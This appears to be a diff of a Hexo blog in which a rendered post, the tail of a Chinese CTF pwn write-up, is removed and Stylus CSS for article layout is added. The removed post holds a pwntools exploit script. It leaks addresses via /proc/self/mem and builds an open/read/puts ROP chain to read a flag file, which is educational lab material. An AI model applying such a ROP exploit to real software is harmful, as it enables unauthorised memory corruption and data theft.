class="line">process_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;process_base:&quot;</span>+<span class="built_in">hex</span>(process_base))</span><br><span class="line"></span><br><span class="line">puts_addr = process_base+puts_plt</span><br><span class="line">read_addr = process_base+read_plt</span><br><span class="line">open_addr = process_base+open_plt</span><br><span class="line">pop_rdi_addr = process_base+pop_rdi</span><br><span class="line">pop_rsi_r15_addr = process_base+pop_rsi_r15</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">stack_arr = <span class="built_in">str</span>(r.recvuntil(<span class="string">b&#x27; rw-p &#x27;</span>, drop=<span class="literal">True</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_arr)</span><br><span class="line">stack_start = <span class="built_in">int</span>(stack_arr[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line">stack_end = <span class="built_in">int</span>(stack_arr[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_end:&quot;</span>, <span class="built_in">hex</span>(stack_end))</span><br><span class="line"></span><br><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">locate(stack_start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">b&#x27;\n1.Find something&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        success(<span class="string">&#x27;OK!!!&#x27;</span>)</span><br><span class="line">        buf_addr = <span class="built_in">len</span>(content.split(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">                       [<span class="number">0</span>])+i*<span class="number">100000</span>+stack_start</span><br><span class="line">        ret_addr = buf_addr-<span class="number">0x38</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">23</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;NO!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(ret_addr))</span><br><span class="line">flag_addr = ret_addr+<span class="number">8</span>*<span class="number">15</span></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr)+p64(<span class="number">6</span>)+p64(pop_rsi_r15_addr) + \</span><br><span class="line">    p64(flag_addr)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(puts_addr)</span><br><span class="line">payload += <span class="string">b&#x27;/home/ctf/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">give(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/getsum/article/details/104096038" >https://blog.csdn.net/getsum/article/details/104096038<i class="fas fa-external-link-alt"></i></a></p>
-
-        </div>
-
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">长安“战疫”网络安全卫士守护赛wp</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/01/01/nobug/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">nobug</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
-    </div>
-    
-
-        
-            
-    <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
-        <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
-        </script>
-    </div>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
 
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
-    
-</div>
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-            </div>
-        
-    </div>
-</div>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
+
+    }
+
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+  }
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
